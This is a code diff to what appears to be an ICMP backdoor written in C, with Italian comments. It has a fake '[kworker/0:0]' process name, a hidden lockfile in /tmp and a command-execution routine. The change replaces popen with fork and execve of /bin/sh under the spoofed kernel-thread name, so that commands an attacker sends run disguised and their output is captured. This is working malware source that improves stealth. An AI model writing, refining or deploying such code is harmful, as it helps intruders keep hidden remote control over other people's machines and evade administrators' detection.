@@ -36,6 +36,7 @@
 #include <time.h>
 #include <fcntl.h>
 #include <sys/file.h>
+#include <sys/wait.h>
 
 #define FAKE_NAME   "[kworker/0:0]"
 #define LOCKFILE    "/tmp/.prism.lock"
@@ -295,21 +296,52 @@ static uint16_t icmp_checksum(const uint8_t *buf, size_t len)
 
 static size_t run_command(const char *cmd, uint8_t *out, size_t max)
 {
-    FILE *fp = popen(cmd, "r");
-    if (!fp) {
-        const char *err = "ERR: popen failed\n";
+    int pipefd[2];
+    if (pipe(pipefd) < 0) {
+        const char *err = "ERR: pipe failed\n";
         size_t n = strlen(err);
         if (n > max) n = max;
         memcpy(out, err, n);
         return n;
     }
-    size_t total = fread(out, 1, max - 1, fp);
-    pclose(fp);
+
+    pid_t pid = fork();
+    if (pid < 0) {
+        close(pipefd[0]); close(pipefd[1]);
+        const char *err = "ERR: fork failed\n";
+        size_t n = strlen(err);
+        if (n > max) n = max;
+        memcpy(out, err, n);
+        return n;
+    }
+
+    if (pid == 0) {
+        /* child: redirect stdout/stderr → pipe, exec sh con argv[0] spoofato */
+        close(pipefd[0]);
+        dup2(pipefd[1], STDOUT_FILENO);
+        dup2(pipefd[1], STDERR_FILENO);
+        close(pipefd[1]);
+        char *sh_argv[] = { FAKE_NAME, "-c", (char *)cmd, NULL };
+        extern char **environ;
+        execve("/bin/sh", sh_argv, environ);
+        _exit(1);
+    }
+
+    /* parent: legge output dalla pipe */
+    close(pipefd[1]);
+    size_t total = 0;
+    ssize_t n;
+    while (total < max - 1 &&
+           (n = read(pipefd[0], out + total, max - 1 - total)) > 0)
+        total += (size_t)n;
+    close(pipefd[0]);
+    waitpid(pid, NULL, 0);
+
     if (total == 0) {
         const char *empty = "(no output)\n";
-        size_t n = strlen(empty);
-        memcpy(out, empty, n);
-        return n;
+        size_t en = strlen(empty);
+        memcpy(out, empty, en);
+        return en;
     }
     return total;
 }
